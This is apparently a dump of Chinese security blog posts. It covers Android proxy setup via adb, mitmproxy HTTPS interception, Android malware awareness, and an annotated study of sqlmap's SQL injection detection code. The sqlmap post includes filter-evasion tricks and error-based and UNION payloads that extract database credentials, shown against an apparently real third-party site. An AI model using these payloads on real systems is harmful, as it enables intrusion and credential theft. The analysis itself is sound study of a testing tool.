-&gt; 高级选项 -&gt; 填写代理相关信息 使用 adb shell 执行命令 1adb shell settings put global http_proxy 192.168.xx.xxx:8888 Android Proxy Toggle https://github.com/theappbusiness/android-proxy-toggle.git 要正常使用 app 需要用 adb shell 连接上设置相应的权限： 1adb shell pm grant com.kinandcarta.create.proxytoggle android.permission.WRITE_SECURE_SETTINGS OnePlus 7T 升级到 Android 12 后，执行上面的命令将出错: 1234567891011121314151617181920OnePlus7T:/ $ pm grant com.kinandcarta.create.proxytoggle android.permission.WRITE_SECURE_SETTINGSException occurred while executing 'grant':java.lang.SecurityException: grantRuntimePermission: Neither user 2000 nor current process has android.permission.GRANT_RUNTIME_PERMISSIONS. at android.app.ContextImpl.enforce(ContextImpl.java:2187) at android.app.ContextImpl.enforceCallingOrSelfPermission(ContextImpl.java:2215) at com.android.server.pm.permission.PermissionManagerService.grantRuntimePermissionInternal(PermissionManagerService.java:1477) at com.android.server.pm.permission.PermissionManagerService.grantRuntimePermission(PermissionManagerService.java:1459) at android.permission.PermissionManager.grantRuntimePermission(PermissionManager.java:378) at com.android.server.pm.PackageManagerShellCommand.runGrantRevokePermission(PackageManagerShellCommand.java:2419) at com.android.server.pm.PackageManagerShellCommand.onCommand(PackageManagerShellCommand.java:260) at com.android.modules.utils.BasicShellCommandHandler.exec(BasicShellCommandHandler.java:97) at android.os.ShellCommand.exec(ShellCommand.java:38) at com.android.server.pm.PackageManagerService.onShellCommand(PackageManagerService.java:25948) at android.os.Binder.shellCommand(Binder.java:970) at android.os.Binder.onTransact(Binder.java:854) at android.content.pm.IPackageManager$Stub.onTransact(IPackageManager.java:4818) at com.android.server.pm.PackageManagerService.onTransact(PackageManagerService.java:8987) at android.os.Binder.execTransactInternal(Binder.java:1226) at android.os.Binder.execTransact(Binder.java:1163) 少数派的文章 在 ColorOS 上免 root 玩机，请先打开这个开关 中指出需要在开发者选项中开启 禁止权限监控。 开启后可以正常执行 pm grant 命令，执行成功后可以使用 dumpsys package &lt;package name&gt; 列出所有的权限。 1234567dumpsys package com.kinandcarta.create.proxytoggle | grep permission requested permissions: android.permission.WRITE_SECURE_SETTINGS android.permission.WRITE_SETTINGS install permissions: android.permission.WRITE_SECURE_SETTINGS: granted=true 恢复无代理如果遇上一些异常情况，比如错误卸载了 Android Proxy Toggle, 可以使用下面命令去掉 Android 全局代理。 123adb shell settings delete global http_proxyadb shell settings delete global global_http_proxy_hostadb shell settings delete global global_http_proxy_port","link":"/cn/android_stunnel/"},{"title":"mitmproxy 简介","text":"主要特色：Intercept HTTP &amp; HTTPS requests and responses and modify them on the fly 使用python编写，可以在windows，Linux， Mac 下运行，这点比 fiddler 有优势。可以修改报文内容，这点很不错。 官方网站： https://www.mitmproxy.org/ 文档：https://docs.mitmproxy.org/stable/ ☆ 1. 安装参考 https://docs.mitmproxy.org/stable/overview-installation/ 12sudo dnf install -y python-pip python-devel libffi-devel openssl-devel libxml2-devel libxslt-devel libpng-devel libjpeg-develsudo pip install mitmproxy # or pip install --user mitmproxy ☆ 2. 基本使用mitmproxy --listen-host 127.0.0.1 -p 8080 --listen-host address to bind address -p bind port -s “script.py –bar”, –script “script.py –bar” Run a script. Surround with quotes to pass script 2.1 mitmproxy 界面操作- ？ 显示帮助信息 - h, j, k, l 上下左右，同 vi - enter 进入具体报文 - q 退出界面 - tab 详细报文内容页面 - E 导出报文内容 ☆ 3. 导入mitmproxy的 CA使用mitmproxy 最大的原因就是因为它可以对付https报文。参考 https://docs.mitmproxy.org/stable/concepts-certificates/ mitmproxy 的 CA 证书放在 ~/.mitmproxy 目录， 可以在不同设备中添加。 3.1 目标设备为Linux导入证书 Google Chrome 设置 -&gt; HTTPS/SSL -&gt; 证书管理 -&gt; 授权中心 Firefox 没用Firefox，估计也类似。 设置代理设置好CA后，设置浏览器使用mitmproxy代理即可，可以考虑使用浏览器代理插件。 3.2 目标设备为 Android导入证书adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/Download 设置 -&gt; 安全 -&gt; 证书存储 -&gt; 从手机存储安装， 选择上传的CA证书。 设置代理emulator 上可以通过下面的命令行，设置代理。 ./emulator -avd 7.0_x86 -http-proxy http://127.0.0.1:8080 真实的设备上，可以通过设置 wifi 代理，或者使用下面的命令行。 12adb shell settings put global http_proxy 127.0.0.1:8888adb reverse tcp:8888 tcp:8080 在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口。 ☆ 4. 透明模式mitmproxy 支持透明部署，具体的方法可以参考下面的文章。 https://docs.mitmproxy.org/stable/howto-transparent/ ☆ 5. 修改报文内容github 上有很多例子，这次没有需求，可以参考 https://github.com/mitmproxy/mitmproxy/tree/main/examples/addonshttps://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib 官方文档上给了个简单例子 12def response(flow): flow.response.headers[&quot;newheader&quot;] = &quot;foo&quot; 给http响应报文的头部添加一个 newheader 的字段。 ☆ 6. socks 模式mitmproxy -m socks5 作为 SOCKS5 proxy server 使用 ☆ 7. 总结这里说到的内容非常少，mitmproxy这个工具还是很强大的。 参考资料https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/","link":"/cn/mitmproxy/"},{"title":"关于恶意 Android 软件的那些事","text":"近年来，Android手机平台上的恶意App呈不断上升的趋势，根据G DATA的数据仅2015年 第一季度发现了440267 种新的安卓恶意软件，也就是说，全球范围内每18秒就有一个新的恶意软件被发现。而天朝由于Google被封的原因，更是使恶意软件的传播更加猖獗。Google Play store 为了保证Android用户的安全做了大量的努力，和国内的一些第三方应用市场相比安全一些的。 重打包是Android App主流的传播方式之一，和以前单独的恶意App不同，重打包的软件 在合法正常的App中插入恶意代码，迷惑性极强，一般用户觉察不出什么不同。而重打包选取 的App也大多是非常流行的App，如愤怒的小鸟之类,这些都在地下市场隐秘的进行着。重打包 App然后上传第三方App应用市场，第三方市场把关不严格的话，这些插入了恶意代码的App 就可以下载安装了。 除了重打包短信，彩信也是Android 恶意App传播的主要方式，和以前QQ的消息尾巴类似发一些奇怪的话，后面加上短链接。短链接就是经过压缩的链接，没法一些看出原始的链接，点击后会自动下载恶意App。臭名昭著的“相册”就是通过这种方式传播，短信的内容是：小明，你还记得这些照片吗? t.cn/xyz1 注意这里的名字小明是正确的，相册偷取了大量的手机通讯录，按照通讯录的名字来发送，迷惑性大大增强了。 还有值得大家注意的是，一定要警惕申请设备管理员权限的App，设备管理员可以做很多高权限的事，比如修改设备密码，擦掉数据等操作，Android手机的勒索软件就是修改了设备的密码，禁止手机主人进入手机，而进行勒索的，最近这类软件的数目增加很快，大家一定要注意。 上面说了很多Android恶意软件相关的内容，也给大家一些安全建议,提高了安全意识也就不容易中招了。 尽量在Google play 或者官方网站下载APP，不要第三方应用市场随意下载 不要随意点击不明链接 对于申请设备管理员的App，保持高度警惕 最后教大家一招急救，许多Android手机也有安全模式，安全模式只加载出厂应用，进入了安全模式，删除恶意软件，可能可以挽救你的手机 :)","link":"/cn/android_malware/"},{"title":"Google Chrome 浏览器 Adobe Flash Player 升级","text":"某一天突然发现网页中flash已经不能正常显示了（我一般都禁用），显示 out of data 错误。 访问 chrome://components/ 可以升级 Adobe Flash Player Adobe Flash Player - 检查更新， 失败。这里有一个坑，插件中的代理设置是无法影响chrome 内部程序的，必须设置环境变量或者直接使用命令行来设置全局代理。 google-chrome —proxy-server=”socks://127.0.0.1:9999” 重新检查更新，可以成功更新了，重启后生效了，已经不报 out of data 错误了。为了保险把系统中flash player也给升级，打开网页 https://get.adobe.com/flashplayer/otherversions/ step 1 选Linux (64 bit), step 2 选 yum，下载后安装，后续可以使用dnf 升级了。","link":"/cn/chrome_flash_update/"},{"title":"sqlmap 中的 SQL Injection 检测技术","text":"https://github.com/henices/sqlihttps://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005) 基于信道的 sql injection 分类InbandSQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错误信息中,这是最简单的攻击类型。 Out-of-bandSQL查询数据的传输使用不同的频道(e.g HTTP，DNS)， 这是从数据库中获取大量数据简单的方法。 Inferential没用真实有用的数据传输，但是攻击者可以通过发送特定的请求，观察数据库服务器的返回的结果的行为重建信息。 基于 sql inject 检测技术的分类boolean-based blind SQL injection也被称为推理SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，一个有效的SQL语句字符串包含 SELECT 子语句，或任何其他用户要检索输出的SQL语句。对于每个HTTP响应，将其 headers/body和原始请求的做比较，该工具一个字符一个字符地分析的注入语句的输出。另外，用户可以提供一个字符串或正则表达式匹配正确的页面。使用SqlMap实现的二分算法来实施执行此技术可以获取七个最大的每个HTTP请求的输出的每一个字符。凡不属于输出纯文本纯字符集，SqlMap将适应与更大范围的算法来检测输出。 error-based SQL injectionsqlmap替换或者追加受影响的HTTP参数一个特定数据的语法错误的SQL语句，分析HTTP 响应header和body，查询DBMS错误信息中是否包含注入的预先定义的字符串链，并且SQL语句的输出在字符串链的中间.这种技术仅在web应用程序被配置成泄漏后端数据库管理系统错误信息时有效。 time-based blind or stacked queries也被称为全盲SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，构造一个有效的SQL语句字符串包含一个查询，使后端DBMS sleep几秒钟。对于每个HTTP响应，比较其响应时间与原始请求的HTTP响应时间，该工具一个字符一个字符地分析的注入语句的输出。和boolean-based技术一样，同样应用了二分算法(bisection algorithm)。 UNION query SQL injectionSqlMap 追加受影响的参数一个以UNION ALL SELECT开始的有效的SQL语句字符串。这种技术当Web应用程序页面内将SELECT语句的同一周期输出，或者类似的，网页上的内容中显示查询结果的每一行时有效。SqlMap是还可以利用部分UNION 查询的SQL注入漏洞，当SQL语句的输出不是在一个周期内的，在构造的区域内只有在查询输出的第一项被显示。 Stacked queries SQL injection也被称为多语句SQL注入（multiple statements SQL injection）：SqlMap 测试 Web 应用程序是否支持批量叠查询, 然后，它支持的情况下，它附加到HTTP请求中受影响的参数，一个分号（;） 随后的SQL语句会被执行。这种技术在执行 SELECT以外的SQL语句时非常有用，根据后端数据库管理系统的不同用户和会话特权,数据定义和数据操作SQL语句可能导致文件系统的读写访问和操作系统命令执行的。 SQL Injection 检测的逃逸技术随机大小写1INSERT =&gt; InsERt 支持的数据库类型： 数据库 是否支持 MSSQL 支持 MySQL 支持 PostgreSQL 支持 Oracle 支持 空格用注释替换1SELECT id FROM users =&gt; SELECT/**/id/**/FROM/**/users 支持的数据库类型： 数据库 是否支持 MSSQL 支持 MySQL 支持 PostgreSQL 支持 Oracle 支持 Access 不支持 Oracle 10g 测试 1SQL&gt; select/**/*/**/from v$version; 1234567BANNER----------------------------------------------------------------Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - ProdPL/SQL Release 10.1.0.3.0 - ProductionCORE 10.1.0.3.0 ProductionTNS for Linux: Version 10.1.0.3.0 - ProductionNLSRTL Version 10.1.0.3.0 - Production PostgreSQL: 1postgres=# select/*abc*/version(); 123 version -------------------------------------------------------------------------------------------------------------------- PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9) 随机注释1INSERT =&gt; IN/**/S/**/ERT 本身语法不支持，但可以对付不正确的过滤. 1postgres=# selec/**/t version(); ERROR: syntax error at or near “selec” 在字符 1第 1 行: selec/**/t version(); Oracle: 1SQL&gt; sel/**/ect v$version; SP2-0734: unknown command beginning “sel/**/ect…” - rest of line ignored. 空格用+替换1SELECT id FROM users =&gt; SELECT+id+FROM+users 随机空格替换1SELECT id FROM users =&gt; SELECT\\rid\\tFROM\\nusers 数据库 是否支持 MSSQL 支持 Mysql 支持 PostgreSQL 支持 Oracle 支持 12345678910$echo -e &quot;select\\t*from\\tv\\$version;&quot;| sqlplus &quot;/ as sysdba&quot;SQL&gt; BANNER----------------------------------------------------------------Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - ProdPL/SQL Release 10.1.0.3.0 - ProductionCORE 10.1.0.3.0 ProductionTNS for Linux: Version 10.1.0.3.0 - ProductionNLSRTL Version 10.1.0.3.0 - Production 1234echo -e &quot;select\\tversion();&quot; | psql -U postgres version -------------------------------------------------------------------------------------------------------------------------------------- PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9) urlencode1SELECT FIELD FROM%20TABLE' =&gt; '%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45' between 替换1A &gt; B' =&gt; 'A NOT BETWEEN 0 AND B 逃避正则表达式检测1or 1=1 使用 or 'a'='a' DBMS分析技术通过错误信息分析DBMS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt; &lt;!-- MySQL --&gt; &lt;dbms value=&quot;MySQL&quot;&gt; &lt;error regexp=&quot;SQL syntax.*MySQL&quot;/&gt; &lt;error regexp=&quot;Warning.*mysql_.*&quot;/&gt; &lt;error regexp=&quot;valid MySQL result&quot;/&gt; &lt;error regexp=&quot;MySqlClient\\.&quot;/&gt; &lt;/dbms&gt; &lt;!-- PostgreSQL --&gt; &lt;dbms value=&quot;PostgreSQL&quot;&gt; &lt;error regexp=&quot;PostgreSQL.*ERROR&quot;/&gt; &lt;error regexp=&quot;Warning.*\\Wpg_.*&quot;/&gt; &lt;error regexp=&quot;valid PostgreSQL result&quot;/&gt; &lt;error regexp=&quot;Npgsql\\.&quot;/&gt; &lt;/dbms&gt; &lt;!-- Microsoft SQL Server --&gt; &lt;dbms value=&quot;Microsoft SQL Server&quot;&gt; &lt;error regexp=&quot;Driver.* SQL[\\-\\_\\ ]*Server&quot;/&gt; &lt;error regexp=&quot;OLE DB.* SQL Server&quot;/&gt; &lt;error regexp=&quot;(\\W|\\A)SQL Server.*Driver&quot;/&gt; &lt;error regexp=&quot;Warning.*mssql_.*&quot;/&gt; &lt;error regexp=&quot;(\\W|\\A)SQL Server.*[0-9a-fA-F]{8}&quot;/&gt; &lt;error regexp=&quot;Exception Details:.*\\WSystem\\.Data\\.SqlClient\\.&quot;/&gt; &lt;error regexp=&quot;Exception Details:.*\\WRoadhouse\\.Cms\\.&quot;/&gt; &lt;/dbms&gt; &lt;!-- Microsoft Access --&gt; &lt;dbms value=&quot;Microsoft Access&quot;&gt; &lt;error regexp=&quot;Microsoft Access Driver&quot;/&gt; &lt;error regexp=&quot;JET Database Engine&quot;/&gt; &lt;error regexp=&quot;Access Database Engine&quot;/&gt; &lt;/dbms&gt; &lt;!-- Oracle --&gt; &lt;dbms value=&quot;Oracle&quot;&gt; &lt;error regexp=&quot;ORA-[0-9][0-9][0-9][0-9]&quot;/&gt; &lt;error regexp=&quot;Oracle error&quot;/&gt; &lt;error regexp=&quot;Oracle.*Driver&quot;/&gt; &lt;error regexp=&quot;Warning.*\\Woci_.*&quot;/&gt; &lt;error regexp=&quot;Warning.*\\Wora_.*&quot;/&gt; &lt;/dbms&gt; &lt;!-- DB2 --&gt; &lt;dbms value=&quot;DB2&quot;&gt; &lt;error regexp=&quot;CLI Driver.*DB2&quot;/&gt; &lt;error regexp=&quot;DB2 SQL error&quot;/&gt; &lt;/dbms&gt; &lt;!-- Informix --&gt; &lt;dbms value=&quot;Informix&quot;&gt; &lt;error regexp=&quot;Exception.*Informix&quot;/&gt; &lt;/dbms&gt; &lt;!-- Interbase/Firebird --&gt; &lt;dbms value=&quot;Firebird&quot;&gt; &lt;error regexp=&quot;Dynamic SQL Error&quot;/&gt; &lt;error regexp=&quot;Warning.*ibase_.*&quot;/&gt; &lt;/dbms&gt; &lt;!-- SQLite --&gt; &lt;dbms value=&quot;SQLite&quot;&gt;AND '[RANDSTR]'='[RANDSTR] &lt;error regexp=&quot;SQLite/JDBCDriver&quot;/&gt; &lt;error regexp=&quot;SQLite.Exception&quot;/&gt; &lt;error regexp=&quot;System.Data.SQLite.SQLiteException&quot;/&gt; &lt;error regexp=&quot;Warning.*sqlite_.*&quot;/&gt; &lt;error regexp=&quot;Warning.*SQLite3::&quot;/&gt; &lt;/dbms&gt; &lt;!-- SAP MaxDB --&gt; &lt;dbms value=&quot;SAP MaxDB&quot;&gt; &lt;error regexp=&quot;SQL error.*POS([0-9]+).*&quot;/&gt; &lt;error regexp=&quot;Warning.*maxdb.*&quot;/&gt; &lt;/dbms&gt; &lt;!-- Sybase --&gt; &lt;dbms value=&quot;Sybase&quot;&gt; &lt;error regexp=&quot;Warning.*sybase.*&quot;/&gt; &lt;error regexp=&quot;Sybase message&quot;/&gt; &lt;error regexp=&quot;Sybase.*Server message.*&quot;/&gt; &lt;/dbms&gt; &lt;!-- Ingres --&gt; &lt;dbms value=&quot;Ingres&quot;&gt; &lt;error regexp=&quot;Warning.*ingres_&quot;/&gt; &lt;error regexp=&quot;Ingres SQLSTATE&quot;/&gt; &lt;error regexp=&quot;Ingres\\W.*Driver&quot;/&gt; &lt;/dbms&gt;&lt;/root&gt; 更详细地需要DBMS fingerprint 识别技术 检测SQL Injection 的报文 检查参数是否动态 123456789101112131415161718192021222324252627282930def checkDynParam(place, parameter, value): &quot;&quot;&quot; This function checks if the url parameter is dynamic. If it is dynamic, the content of the page differs, otherwise the dynamicity might depend on another parameter. &quot;&quot;&quot; kb.matchRatio = None infoMsg = &quot;testing if %s parameter '%s' is dynamic&quot; % (place, parameter) logger.info(infoMsg) # 生成一个随机字符串 randInt = randomInt() payload = agent.payload(place, parameter, value, getUnicode(randInt)) logger.debug(&quot;checkDynParam: %s&quot;, payload) dynResult = Request.queryPage(payload, place, raise404=False) # 如果和原先页面一样，不是动态参数 if True == dynResult: return False infoMsg = &quot;confirming that %s parameter '%s' is dynamic&quot; % (place, parameter) logger.info(infoMsg) # 再次检查，确认 randInt = randomInt() payload = agent.payload(place, parameter, value, getUnicode(randInt)) dynResult = Request.queryPage(payload, place, raise404=False) return not dynResult 启发式检测，长度为10的 “,’, ), ( 随机字符串， 使用python RandomStr, 如果发生已知错误，报可能存在sql injection， 可能的数据库 基于risk 和 level的级别，使用payloads.xml中的报文进行检测 判断url连接是否稳定，连续连接url两次，如果返回内容完全相同，则认为url稳定。 NullConnection http://www.wisec.it/sectou.php?id=472f952d79293 怎么判断injected payload 成功comparison 算法， boolean-based blind SQL injections使用 difflib.SequenceMatcher, 基于页面相似度如果请求发生错误，所有不正确的请求都认为正确。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165def comparison(page, getRatioValue=False, pageLength=None): if page is None and pageLength is None: return None regExpResults = None seqMatcher = getCurrentThreadData().seqMatcher #logger.debug(kb.pageTemplate) seqMatcher.set_seq1(kb.pageTemplate) if page: # String to match in page when the query is valid #a.1 如果出现指定字符串，返回True if conf.string: condition = conf.string in page return condition if not getRatioValue else (MAX_RATIO if condition else MIN_RATIO) # Regular expression to match in page when the query is valid # a.2 如果出现指定正则表达式，返回Ture if conf.regexp: condition = re.search(conf.regexp, page, re.I | re.M) is not None return condition if not getRatioValue else (MAX_RATIO if condition else MIN_RATIO) # In case of an DBMS error page return None if kb.errorIsNone and (wasLastRequestDBMSError() or wasLastRequestHTTPError()): return None # Dynamic content lines to be excluded before comparison # a.4 比较前先将两个页面的动态内容移除 if not kb.nullConnection: page = removeDynamicContent(page) seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate)) if not pageLength: pageLength = len(page) # 连接发生错误 if kb.nullConnection and pageLength: if not seqMatcher.a: errMsg = &quot;problem occured while retrieving original page content &quot; errMsg += &quot;which prevents sqlmap from continuation. please rerun, &quot; errMsg += &quot;and if problem persists please turn off optimization switches&quot; raise sqlmapNoneDataException, errMsg ratio = 1. * pageLength / len(seqMatcher.a) if ratio &gt; 1.: ratio = 1. / ratio else: # 正常连接情况, 判断是否使用textOnly命令行参数 seqMatcher.set_seq1(getFilteredPageContent(seqMatcher.a, True) if conf.textOnly else seqMatcher.a) seqMatcher.set_seq2(getFilteredPageContent(page, True) if conf.textOnly else page) # float 3 digits ratio = round(seqMatcher.quick_ratio(), 3) logger.debug('ratio: %s' % ratio) # If the url is stable and we did not set yet the match ratio and the # current injected value changes the url page content if kb.matchRatio is None: if kb.pageStable and ratio &gt;= LOWER_RATIO_BOUND and ratio &lt;= UPPER_RATIO_BOUND: kb.matchRatio = ratio logger.debug(&quot;setting match ratio for current parameter to %.3f&quot; % kb.matchRatio) elif not kb.pageStable: # CONSTANT_RATIO = 0.900 kb.matchRatio = CONSTANT_RATIO logger.debug(&quot;setting match ratio for current parameter to default value 0.900&quot;) # If it has been requested to return the ratio and not a comparison # response if getRatioValue: return ratio # ratio &gt; 0.98, 认为两个页面一样 elif ratio &gt; UPPER_RATIO_BOUND: return True elif kb.matchRatio is None: return None else: # url 不稳定 if kb.matchRatio == CONSTANT_RATIO: return ratio &gt; kb.matchRatio else: # DIFF_TOLERANCE = 0.05 magic number return (ratio - kb.matchRatio) &gt; DIFF_TOLERANCE移除动态内容def removeDynamicContent(page): &quot;&quot;&quot; Removing dynamic content from supplied page basing removal on precalculated dynamic markings &quot;&quot;&quot; if page: for item in kb.dynamicMarkings: prefix, suffix = item if prefix is None and suffix is None: continue elif prefix is None:None page = getCompiledRegex('(?s)^.+%s' % suffix).sub(suffix, page) elif suffix is None: page = getCompiledRegex('(?s)%s.+$' % prefix).sub(prefix, page) else: page = getCompiledRegex('(?s)%s.+%s' % (prefix, suffix)).sub('%s%s' % (prefix, suffix), page) return page# 查找动态内容def findDynamicContent(firstPage, secondPage): &quot;&quot;&quot; This function checks if the provided pages have dynamic content. If they are dynamic, proper markings will be made &quot;&quot;&quot; infoMsg = &quot;searching for dynamic content&quot; logger.info(infoMsg) # 返回匹配的内容 blocks = SequenceMatcher(None, firstPage, secondPage).get_matching_blocks() kb.dynamicMarkings = [] # Removing too small matching blocks i = 0 while i &lt; len(blocks): block = blocks[i] (_, _, length) = block # DYNAMICITY_MARK_LENGTH = 32 if length &lt;= DYNAMICITY_MARK_LENGTH: blocks.remove(block) else: i += 1 # Making of dynamic markings based on prefix/suffix principle if len(blocks) &gt; 0: # 在blocks的前后添加None blocks.insert(0, None) blocks.append(None) # for i in xrange(len(blocks) - 1): prefix = firstPage[blocks[i][0]:blocks[i][0] + blocks[i][2]] if blocks[i] else None suffix = firstPage[blocks[i + 1][0]:blocks[i + 1][0] + blocks[i + 1][2]] if blocks[i + 1] else None if prefix is None and blocks[i + 1][0] == 0: continue if suffix is None and (blocks[i][0] + blocks[i][2] &gt;= len(firstPage)): continue # 去掉字符串头和尾的字母和数字 prefix = trimAlphaNum(prefix) suffix = trimAlphaNum(suffix) kb.dynamicMarkings.append((re.escape(prefix[-DYNAMICITY_MARK_LENGTH/2:]) if prefix else None, re.escape(suffix[:DYNAMICITY_MARK_LENGTH/2]) if suffix else None)) if len(kb.dynamicMarkings) &gt; 0: infoMsg = &quot;dynamic content marked for removal (%d region%s)&quot; % (len(kb.dynamicMarkings), 's' if len(kb.dynamicMarkings) &gt; 1 else '') logger.info(infoMsg) grep(正则表达式)， error-based SQL injection, 可以检查MS SQL server， Oracle， Mysql等，使用的语句，使用随机字符串查询，如果返回结果的body，或者头部信息中包含我们构造的随机字符串，则认为存在漏洞.具体数据可以使用sqlmap, payloads.xml，例子: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause1http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136%20AND%20(SELECT%209066%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION()%20AS%20CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a) urldecode 后： 1http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 9066 FROM(SELECT COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION() AS CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) CONCAT 字符串连接 IFNULL 判断是否为空 CAST 将字符串转化为不同的字符集 MID 字符串截取 MID(string, position[, length]) CHAR(58,106,108,98,58) =&gt; :bjl: CHAR(58,108,112,108,58) =&gt; :lpl: 利用的Mysql的一个特性，http://bugs.mysql.com/bug.php?id=32249 Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause这部分没有记录。 PostgreSQL AND error-based - WHERE or HAVING clause这部分没有记录。 Oracle AND error-based - WHERE or HAVING clause (XMLType)1http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 6531 FROM(SELECT COUNT(*),CONCAT(CHAR(58,121,121,98,58),(SELECT MID(IFNULL(CAST(concat(user,char(58),password) AS CHAR), CHAR(32)),1,50) FROM mysql.user LIMIT 0,1),CHAR(58,106,116,113,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) unionTest() 函数，UNION query (inband) SQL injection(1) 设置union 使用的字符和注释(2) 判断union查询的列数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159def forgeInbandQuery(self, query, position, count, comment, prefix, suffix, char, multipleUnions=None, limited=False): &quot;&quot;&quot; Take in input an query (pseudo query) string and return its processed UNION ALL SELECT query. Examples: MySQL input: CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user MySQL output: UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488 PostgreSQL input: (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow PostgreSQL output: UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713 Oracle input: (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)) Oracle output: UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738 Microsoft SQL Server input: (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins Microsoft SQL Server output: UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254 @param query: it is a processed query string unescaped to be forged within an UNION ALL SELECT statement @type query: 